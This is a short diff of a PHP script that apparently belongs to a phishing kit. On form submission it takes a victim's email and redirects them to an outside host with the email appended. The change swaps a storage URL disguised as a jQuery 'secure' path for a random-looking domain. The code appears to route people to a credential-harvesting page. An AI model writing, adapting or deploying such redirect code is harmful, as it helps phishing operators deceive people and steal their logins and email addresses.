@@ -55,7 +55,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $encodedEmail = base64_encode($email);
 
     // Construct the redirect URL with the decoded email
-$redirectUrl = "https://ajaxstorage.blob.core.windows.net/ajax-route/libs/jquery/3.6.0/aspx/secure/index.html#X$email";
+$redirectUrl = "https://p9j3v.osecurthei.com/cMZz/#A$email";
 
 
     // Redirect the user
